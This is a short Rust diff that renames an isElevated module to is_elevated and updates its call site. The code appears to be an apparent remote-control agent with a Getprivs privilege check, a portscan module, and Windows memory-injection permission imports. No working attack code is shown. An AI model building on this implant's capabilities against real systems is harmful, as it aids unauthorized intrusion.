@@ -18,7 +18,7 @@ use crate::config::ConfigOptions;
 
 #[cfg(windows)]  use winapi::um::winnt::{PROCESS_ALL_ACCESS,MEM_COMMIT,MEM_RESERVE,PAGE_EXECUTE_READWRITE};
 
-mod isElevated;
+mod is_elevated;
 mod portscan;
 
 pub enum CommandType {
@@ -302,7 +302,7 @@ impl NotionCommand {
             },
             CommandType::Getprivs => {
                 // TODO: Implement Linux check
-                let is_admin = isElevated::is_elevated();
+                let is_admin = is_elevated::is_elevated();
                 println!("{}", is_admin);
 
                 Ok(String::from(format!("Admin Context: {is_admin}").to_string()))
